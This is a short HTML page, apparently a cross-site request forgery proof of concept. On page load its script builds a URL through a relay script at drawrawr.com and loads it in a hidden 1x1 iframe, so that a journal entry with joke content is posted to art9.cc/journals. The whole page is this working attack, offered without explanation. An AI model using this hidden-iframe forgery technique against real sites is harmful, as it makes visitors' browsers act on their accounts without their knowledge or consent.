<html>
<head>
<script language = "javascript" src = "/extra/jquery.min.js"></script>
<script type='text/javascript' language='JavaScript'>

function crossDomainPost(writer_url, post_target_url, params){
    var url_params = '';
    for (var key in params){
        url_params =url_params + '&' + key + '='+params[key];
    }
    var url = writer_url + '?post_target_url=' + post_target_url + url_params;
    var iframe = document.createElement('iframe');
    iframe.setAttribute('src', url);
    iframe.setAttribute('width', 1);
    iframe.setAttribute('height', 1);
    iframe.setAttribute('style', 'border: none;');
    var p = document.getElementsByTagName('html');
    p[0].appendChild(iframe);
    alert(url);
}

crossDomainPost("http://drawrawr.com/test2.php","http://art9.cc/journals",{title:"Farts",content:"TEXT",mood:"YES CAT, I AM"})


</script>

</head>
<body>
</body>
</html>
